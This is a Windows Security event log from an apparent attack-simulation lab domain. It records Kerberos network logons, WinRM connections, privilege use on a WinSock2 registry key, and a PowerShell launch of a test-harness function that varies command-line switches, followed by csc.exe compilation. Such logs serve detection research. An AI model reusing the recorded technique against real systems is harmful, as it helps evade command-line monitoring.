03/01/2021 10:55:42 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4624
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logon
OpCode=Info
RecordNumber=1382527
Keywords=Audit Success
Message=An account was successfully logged on.

Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Delegation

New Logon:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		Administrator
	Account Domain:		ATTACKRANGE.LOCAL
	Logon ID:		0x500392A
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{6D9750ED-EBB5-B481-5E82-E1B9C9B4B32E}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
03/01/2021 10:55:42 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4672
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Special Logon
OpCode=Info
RecordNumber=1382526
Keywords=Audit Success
Message=Special privileges assigned to new logon.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		Administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x500392A

Privileges:		SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeTakeOwnershipPrivilege
			SeDebugPrivilege
			SeSystemEnvironmentPrivilege
			SeLoadDriverPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege
			SeEnableDelegationPrivilege
03/01/2021 10:55:42 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382525
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Inbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		55164
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		5985
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:42 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382524
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		5596
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		55164
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		5985
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:42 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382523
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		5596
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Source Address:		::
	Source Port:		55164
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:55:43 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382537
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Inbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		0
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		128
	Protocol:		58

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:43 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382536
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Outbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		128
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		0
	Protocol:		58

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:43 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382535
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	-
	Object Name:	-
	Object Handle:	0x2a0

Process Information:
	Process ID:	0x1ad4
	Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe

Requested Operation:
	Desired Access:	983103
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:43 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382534
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	Key
	Object Name:	\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters
	Object Handle:	0x2a0

Process Information:
	Process ID:	0x1ad4
	Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe

Requested Operation:
	Desired Access:	DELETE
				READ_CONTROL
				WRITE_DAC
				WRITE_OWNER
				Query key value
				Set key value
				Create sub-key
				Enumerate sub-keys
				Notify about changes to keys
				Create Link
				
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:44 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382542
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Inbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		0
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		128
	Protocol:		58

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:44 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382541
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Outbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		128
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		0
	Protocol:		58

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:44 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382540
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	-
	Object Name:	-
	Object Handle:	0x2b4

Process Information:
	Process ID:	0x1ad4
	Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe

Requested Operation:
	Desired Access:	983103
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:44 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382539
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	Key
	Object Name:	\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters
	Object Handle:	0x2b4

Process Information:
	Process ID:	0x1ad4
	Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe

Requested Operation:
	Desired Access:	DELETE
				READ_CONTROL
				WRITE_DAC
				WRITE_OWNER
				Query key value
				Set key value
				Create sub-key
				Enumerate sub-keys
				Notify about changes to keys
				Create Link
				
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:44 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382538
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61064
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4634
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logoff
OpCode=Info
RecordNumber=1382559
Keywords=Audit Success
Message=An account was logged off.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		Administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x500392A

Logon Type:			3

This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4634
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logoff
OpCode=Info
RecordNumber=1382558
Keywords=Audit Success
Message=An account was logged off.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		Administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x5002DCF

Logon Type:			3

This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4634
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logoff
OpCode=Info
RecordNumber=1382557
Keywords=Audit Success
Message=An account was logged off.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		Administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x5005823

Logon Type:			3

This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382556
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		Administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x5001929

Process Information:
	Process ID:	0x2138
	Process Name:	C:\Windows\System32\wsmprovhost.exe
	Exit Status:	0x0
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382555
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x15dc
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4624
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logon
OpCode=Info
RecordNumber=1382554
Keywords=Audit Success
Message=An account was successfully logged on.

Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Delegation

New Logon:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		Administrator
	Account Domain:		ATTACKRANGE.LOCAL
	Logon ID:		0x5005823
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{6D9750ED-EBB5-B481-5E82-E1B9C9B4B32E}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4672
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Special Logon
OpCode=Info
RecordNumber=1382553
Keywords=Audit Success
Message=Special privileges assigned to new logon.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		Administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x5005823

Privileges:		SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeTakeOwnershipPrivilege
			SeDebugPrivilege
			SeSystemEnvironmentPrivilege
			SeLoadDriverPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege
			SeEnableDelegationPrivilege
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4648
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logon
OpCode=Info
RecordNumber=1382552
Keywords=Audit Success
Message=A logon was attempted using explicit credentials.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1
	Logon GUID:		{36BA520A-0022-0F72-A18C-6529BD1456FC}

Account Whose Credentials Were Used:
	Account Name:		administrator
	Account Domain:		ATTACKRANGE.LOCAL
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Target Server:
	Target Server Name:	win-dc-974.attackrange.local
	Additional Information:	HTTP/win-dc-974.attackrange.local

Process Information:
	Process ID:		0x15dc
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Network Information:
	Network Address:	-
	Port:			-

This event is generated when a process attempts to log on an account by explicitly specifying that account’s credentials.  This most commonly occurs in batch-type configurations such as scheduled tasks, or when using the RUNAS command.
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382551
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Inbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		0
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		128
	Protocol:		58

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382550
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Outbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		128
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		0
	Protocol:		58

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382549
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	-
	Object Name:	-
	Object Handle:	0x2b0

Process Information:
	Process ID:	0x1ad4
	Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe

Requested Operation:
	Desired Access:	983103
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382548
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	Key
	Object Name:	\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters
	Object Handle:	0x2b0

Process Information:
	Process ID:	0x1ad4
	Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe

Requested Operation:
	Desired Access:	DELETE
				READ_CONTROL
				WRITE_DAC
				WRITE_OWNER
				Query key value
				Set key value
				Create sub-key
				Enumerate sub-keys
				Notify about changes to keys
				Create Link
				
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382547
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59336
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382546
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		51662
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382545
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		51662
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382544
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		51662
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382543
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		51662
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382569
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x2044
	Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
	Exit Status:	0x0
03/01/2021 10:55:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382568
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x2134
	Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
	Exit Status:	0x0
03/01/2021 10:55:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382567
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2134
	New Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x2044
	Creator Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
	Process Command Line:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\2\RES36A.tmp" "c:\Users\Administrator\AppData\Local\Temp\2\qjia4v1n\CSC592915932CD14907B29FCB24DDD754AC.TMP"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382566
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0xa10
	Process Name:	C:\Windows\System32\dllhost.exe
	Exit Status:	0x0
03/01/2021 10:55:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382565
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2044
	New Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1998
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\2\qjia4v1n\qjia4v1n.cmdline"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382564
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1998
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop} 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

